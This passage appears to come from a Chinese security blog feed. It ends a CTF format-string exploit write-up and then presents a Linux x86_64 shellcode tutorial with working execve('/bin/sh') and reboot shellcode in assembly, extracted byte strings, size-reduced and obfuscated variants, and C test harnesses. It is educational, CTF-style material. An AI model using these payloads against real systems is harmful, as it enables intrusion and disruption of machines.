│FGH&amp;│····│·arg│4···│</span><br><span class="line">    00000020  e5 9c b0 e5  9d 80 ef bc  9a 30 78 37  66 66 66 66  │····│····│·0x7│ffff│</span><br><span class="line">    00000030  66 66 66 64  66 32 36 0a  0a                        │fffd│f26·│·│</span><br><span class="line">    00000039</span><br><span class="line">AAAAAAAAAAAABCDEFGH&amp;\xdf\xff\xff\xff\x7farg4的地址：0x7fffffffdf26</span><br><span class="line"></span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta">$ </span><span class="language-bash"> </span></span><br></pre></td></tr></table></figure><p>可以看到，上面输出AAAAAAAA后紧接着输出了ABCDEFGH，攻击成功！<br>总结：<br>1.arg4地址要放payload的最后，否则64位地址高位是0，小端存储时高位的0会被放在高地址处，读完arg4的地址时字符串就会被00截断。<br>2.‘A’*11+’%10$s’为16个字节，要注意对齐16字节。<br>3.‘A’*11+’%10$s’占用一个偏移。<br>4.若为32位，且地址高位没有0，则payload构造为p32(addr_arg4)+’%8$s’.（偏移不一定为8，看情况）</p><p>可以看到这种方法非常强大，可以获得栈中任意的值。</p><blockquote><p>参考：</p><p>​<a href="https://www.anquanke.com/post/id/194458">64位格式化字符串漏洞修改got表利用详解</a></p><p>​<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">格式化字符串漏洞</a></p><p>​<a href="https://bbs.pediy.com/thread-268850.htm">64位格式化字符串漏洞pwn入门</a></p><p>​<a href="https://blog.csdn.net/Little_Small_Joze/article/details/114650396">python3的pwn用法——when_did_you_born题解</a>——这里我了解到 python3 的 can’t concat str to bytes 问题。</p><p>​<a href="https://blog.csdn.net/weixin_39943442/article/details/114405599">python3-pwntools教程_CTF PWN工具篇1</a>——python3 的 pwntools 使用教程</p></blockquote><blockquote><p>相关文章：</p><p>​<a href="https://www.anquanke.com/post/id/222623#h2-0">格式化字符串大杂烩</a></p><p>​<a href="https://www.anquanke.com/post/id/184717#h2-0">非栈上格式化字符串漏洞利用技巧</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-格式化输出函数&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-格式化输出函数&quot;&gt;&lt;/a&gt; 1 格式化输出函数&lt;/h2&gt;
&lt;h3 id=&quot;11-变参函数&quot;&gt;&lt;a class=&quot;markdownIt-Anc</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="格式化字符串" scheme="https://www.rgzzplus.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>Linux_shellcode开发之实战</title>
    <link href="https://www.rgzzplus.com/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/"/>
    <id>https://www.rgzzplus.com/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/</id>
    <published>2022-08-08T14:39:50.000Z</published>
    <updated>2022-09-06T06:24:23.455Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-打开-terminal"><a class="markdownIt-Anchor" href="#1-打开-terminal"></a> 1. 打开 terminal</h2><blockquote><p>参考：</p><p>​<a href="https://evian-zhang.github.io/introduction-to-linux-x86_64-syscall/index.html#linux-x86_64%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%AE%80%E4%BB%8B">Linux x86_64系统调用简介</a></p><p>​<a href="https://syscalls.w3challs.com/?arch=x86_64">syscall大全</a></p><p>​<a href="http://www.shell-storm.org/shellcode/">Shellcodes database for study cases</a></p><p>​<a href="https://www.exploit-db.com/shellcodes">Exploit Database Shellcodes</a></p><p>​《UNIX环境高级编程第3版》</p></blockquote><p>首先我们来试试最经典的例子 ---- 打开 terminal</p><p>那么问题来了用c语言该怎么写？</p><blockquote><p>int execve(const char *<em><strong>filename</strong></em>, char *const <strong>argv</strong>[], char *const <strong>envp</strong>[]);</p><p>filename:要执行的程序</p><p>argv[]：传递给新程序的参数字符串数组</p><p>envp[]:传递给新程序的环境变量字符串数组</p></blockquote><h3 id="11-c语言版本"><a class="markdownIt-Anchor" href="#11-c语言版本"></a> 1.1 C语言版本</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *name[<span class="number">2</span>];</span><br><span class="line">name[<span class="number">0</span>] = <span class="string">&quot;bin/sh&quot;</span>;</span><br><span class="line">name[<span class="number">1</span>] = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用gcc编译一下，看看能否运行？</p><ul><li>-z execstack 关闭 canary</li><li>-g 添加信息，便于 gdb 调试</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc getTerminal.c -o terminal -z execstack -g</span><br><span class="line">./terminal</span><br></pre></td></tr></table></figure><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220806232610222.png" alt="image-20220806232610222"></p><p>可以看到程序成功执行，说明我们的思路没有问题。</p><h3 id="12-写汇编"><a class="markdownIt-Anchor" href="#12-写汇编"></a> 1.2 写汇编</h3><p>从上面可以看到，这个 execve(“bin/sh”, [“bin/sh”], NULL) 参数是没有问题的，根据 execve 的系统调用号 0x3b 来布置函数栈帧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;//bin/sh&#x27;, rsi = &#x27;//bin/sh&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 execve_sh64.asm</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 execve_sh64.o -o execve_sh64</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_sh64</span> </span><br></pre></td></tr></table></figure><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220807220010173.png" alt="image-20220807220010173"></p><h3 id="13-提取机器码"><a class="markdownIt-Anchor" href="#13-提取机器码"></a> 1.3 提取机器码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/execveDir$ objdump -d execve_sh64</span><br><span class="line"></span><br><span class="line">execve_sh64：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:48 31 d2             xor    %rdx,%rdx</span><br><span class="line">  401003:48 bb 2f 2f 62 69 6e movabs $0x68732f6e69622f2f,%rbx</span><br><span class="line">  40100a:2f 73 68 </span><br><span class="line">  40100d:48 c1 eb 08          shr    $0x8,%rbx</span><br><span class="line">  401011:53                   push   %rbx</span><br><span class="line">  401012:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  401015:50                   push   %rax</span><br><span class="line">  401016:57                   push   %rdi</span><br><span class="line">  401017:48 89 e6             mov    %rsp,%rsi</span><br><span class="line">  40101a:b0 3b                mov    $0x3b,%al</span><br><span class="line">  40101c:0f 05                syscall </span><br><span class="line"></span><br><span class="line">&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; </span><br></pre></td></tr></table></figure><p>自动提取机器码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(objdump  -d readfile.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br></pre></td></tr></table></figure><h3 id="14-测试"><a class="markdownIt-Anchor" href="#14-测试"></a> 1.4 测试</h3><p>将机器码嵌入C语言运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> shellcode[] =  <span class="string">&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span>;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc execve_sh64.c -o execve_sh64 -z execstack -z norelro -no-pie -g</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_sh64</span></span><br></pre></td></tr></table></figure><p>成功执行。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220807230925573.png" alt="image-20220807230925573"></p><h3 id="15-更少字节的"><a class="markdownIt-Anchor" href="#15-更少字节的"></a> 1.5 更少字节的</h3><blockquote><p>参考：<a href="http://www.shell-storm.org/shellcode/files/shellcode-866.php">FreeBSD x86_64 execve, 28 bytes</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">xor rcx, rcx</span><br><span class="line">mul rcx</span><br><span class="line"></span><br><span class="line">add al, 0x3b     ; execve()</span><br><span class="line">mov rbx, 0x68732f2f6e69622f ; hs//nib/</span><br><span class="line"></span><br><span class="line">; Argument one shell[0] = &quot;/bin//sh&quot;</span><br><span class="line">push rdx     ; null</span><br><span class="line">push rbx     ; hs//nib/</span><br><span class="line"></span><br><span class="line">; We need pointers for execve()</span><br><span class="line">push rsp     ; *pointer to shell[0]</span><br><span class="line">pop rdi      ; Argument 1</span><br><span class="line"></span><br><span class="line">; Argument two shell (including address of each argument in array)</span><br><span class="line">push rdx     ; null</span><br><span class="line">push rdi     ; address of shell[0]</span><br><span class="line"></span><br><span class="line">; We need pointers for execve()</span><br><span class="line">push rsp     ; address of char * shell</span><br><span class="line">pop rsi      ; Argument 2</span><br><span class="line"></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/execveDir$ nasm -f elf64 execve_sh64.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 execve_sh64.o -o execve_sh64</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./execve_sh64 </span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">sakura@Kylin:~/文档/execveDir$ objdump -d execve_sh64</span><br><span class="line"></span><br><span class="line">execve_sh64：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:48 31 c9             xor    %rcx,%rcx</span><br><span class="line">  401003:48 f7 e1             mul    %rcx</span><br><span class="line">  401006:04 3b                add    <span class="variable">$0x3b</span>,%al</span><br><span class="line">  401008:48 bb 2f 62 69 6e 2f movabs <span class="variable">$0x68732f2f6e69622f</span>,%rbx</span><br><span class="line">  40100f:2f 73 68 </span><br><span class="line">  401012:52                   push   %rdx</span><br><span class="line">  401013:53                   push   %rbx</span><br><span class="line">  401014:54                   push   %rsp</span><br><span class="line">  401015:5f                   pop    %rdi</span><br><span class="line">  401016:52                   push   %rdx</span><br><span class="line">  401017:57                   push   %rdi</span><br><span class="line">  401018:54                   push   %rsp</span><br><span class="line">  401019:5e                   pop    %rsi</span><br><span class="line">  40101a:0f 05                syscall </span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/execveDir$ <span class="keyword">for</span> i <span class="keyword">in</span> $(objdump  -d execve_sh64.o | grep <span class="string">&quot;^ &quot;</span> | <span class="built_in">cut</span>  -f2); <span class="keyword">do</span> <span class="built_in">echo</span>  -n  <span class="string">&#x27;\x&#x27;</span><span class="variable">$i</span>; <span class="keyword">done</span>; <span class="built_in">echo</span> </span><br><span class="line">\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> shellcode[] =  <span class="string">&quot;\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span>;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/execveDir$ gcc execve_sh64.c -o execve_sh64 -z execstack -z norelro -no-pie -g</span><br><span class="line">....</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./execve_sh64</span><br><span class="line">Shellcode length: 28 bytes</span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">sakura@Kylin:~/文档/execveDir$ </span><br></pre></td></tr></table></figure><h3 id="16-变形"><a class="markdownIt-Anchor" href="#16-变形"></a> 1.6 变形</h3><h4 id="0x1"><a class="markdownIt-Anchor" href="#0x1"></a> 0x1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">xor rcx, rcx</span><br><span class="line">mul rcx</span><br><span class="line"></span><br><span class="line">call do</span><br><span class="line"></span><br><span class="line">add al, 0x3b     ; execve()</span><br><span class="line">mov rbx, 0x68732f2f6e69622f ; hs//nib/</span><br><span class="line"></span><br><span class="line">; Argument one shell[0] = &quot;/bin//sh&quot;</span><br><span class="line">push rdx     ; null</span><br><span class="line">push rbx     ; hs//nib/</span><br><span class="line"></span><br><span class="line">; We need pointers for execve()</span><br><span class="line">push rsp     ; *pointer to shell[0]</span><br><span class="line">pop rdi      ; Argument 1</span><br><span class="line"></span><br><span class="line">; Argument two shell (including address of each argument in array)</span><br><span class="line">push rdx     ; null</span><br><span class="line">push rdi     ; address of shell[0]</span><br><span class="line"></span><br><span class="line">; We need pointers for execve()</span><br><span class="line">push rsp     ; address of char * shell</span><br><span class="line">pop rsi      ; Argument 2</span><br><span class="line"></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">_do:</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 execve_sh64.asm</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 execve_sh64.o -o execve_sh64</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_sh64</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d execve_sh64</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="keyword">for</span> i <span class="keyword">in</span> $(objdump  -d readfile.o | grep <span class="string">&quot;^ &quot;</span> | <span class="built_in">cut</span>  -f2); <span class="keyword">do</span> <span class="built_in">echo</span>  -n  <span class="string">&#x27;\x&#x27;</span><span class="variable">$i</span>; <span class="keyword">done</span>; <span class="built_in">echo</span></span> </span><br></pre></td></tr></table></figure><h4 id="0x2"><a class="markdownIt-Anchor" href="#0x2"></a> 0x2</h4><blockquote><p><a href="http://www.shell-storm.org/shellcode/files/shellcode-806.php">Execute /bin/sh - 27 bytes</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">xor eax, eax</span><br><span class="line">mov rbx, 0xFF978CD091969DD1</span><br><span class="line">neg rbx</span><br><span class="line">push rbx</span><br><span class="line">;mov rdi, rsp</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">cdq</span><br><span class="line">push rdx</span><br><span class="line">push rdi</span><br><span class="line">;mov rsi, rsp</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">mov al, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/weixin_42250302/article/details/103432850">汇编求补指令neg</a></p><p><a href="https://chowdera.com/2022/151/202205312301535087.html">64位汇编语言中的符号位扩展说明</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/zmrz1/article/details/53349631">关于汇编语言中cdq指令作用解惑</a></p><p>cdq的作用无非就是将一个32位有符合数扩展为64位有符合数，数据能表示的数不变，具体是这样实现的，比如eax=fffffffb（值为-5），然后cdq把eax的最高位bit，也就是二进制1，全部复制到edx的每一个bit位，EDX 变成 FFFFFFFF，这时eax与edx连起来就是一个64位数，FFFFFFFF FFFFFFFB ，它是一个 64 bit 的大型数字，数值依旧是 -5</p></blockquote><h2 id="2-重启-reboot"><a class="markdownIt-Anchor" href="#2-重启-reboot"></a> 2. 重启 reboot</h2><h3 id="21-找到指令位置"><a class="markdownIt-Anchor" href="#21-找到指令位置"></a> 2.1 找到指令位置</h3><p>首先，查看 reboot 命令所在位置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">whereis reboot</span></span><br><span class="line">reboot: /usr/sbin/reboot /usr/share/man/man8/reboot.8.gz</span><br></pre></td></tr></table></figure><p>用此路径（/usr/sbin/reboot）作为参数，进行系统调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/usr/sbin/reboot&quot;, [&quot;/usr/sbin/reboot&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;/usr/sbin/reboot&#x27;, rsi = &#x27;/usr/sbin/reboot&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">push  rdx</span><br><span class="line">movrbx, &#x27;n/reboot&#x27;</span><br><span class="line">pushrbx</span><br><span class="line">mov rbx, &#x27;/usr/sbi&#x27;</span><br><span class="line">push rbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h3 id="22-编译链接运行"><a class="markdownIt-Anchor" href="#22-编译链接运行"></a> 2.2 编译链接运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 execve_reboot.asm</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 execve_reboot.o -o execve_reboot</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_reboot</span></span><br></pre></td></tr></table></figure><p>然后就重启了。</p><h3 id="23-提取机器码"><a class="markdownIt-Anchor" href="#23-提取机器码"></a> 2.3 提取机器码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d execve_reboot</span> </span><br><span class="line"></span><br><span class="line">execve_reboot：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:48 31 d2             xor    %rdx,%rdx</span><br><span class="line">  401003:52                   push   %rdx</span><br><span class="line">  401004:48 bb 6e 2f 72 65 62 movabs $0x746f6f6265722f6e,%rbx</span><br><span class="line">  40100b:6f 6f 74 </span><br><span class="line">  40100e:53                   push   %rbx</span><br><span class="line">  40100f:48 bb 2f 75 73 72 2f movabs $0x6962732f7273752f,%rbx</span><br><span class="line">  401016:73 62 69 </span><br><span class="line">  401019:53                   push   %rbx</span><br><span class="line">  40101a:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  40101d:50                   push   %rax</span><br><span class="line">  40101e:57                   push   %rdi</span><br><span class="line">  40101f:48 89 e6             mov    %rsp,%rsi</span><br><span class="line">  401022:b0 3b                mov    $0x3b,%al</span><br><span class="line">  401024:0f 05                syscall </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x48\x31\xd2\x52\x48\xbb\x6e\x2f\x72\x65\x62\x6f\x6f\x74\x53\x48\xbb\x2f\x75\x73\x72\x2f\x73\x62\x69\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br></pre></td></tr></table></figure><h3 id="24-测试"><a class="markdownIt-Anchor" href="#24-测试"></a> 2.4 测试</h3><p>将机器码嵌入c语言运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 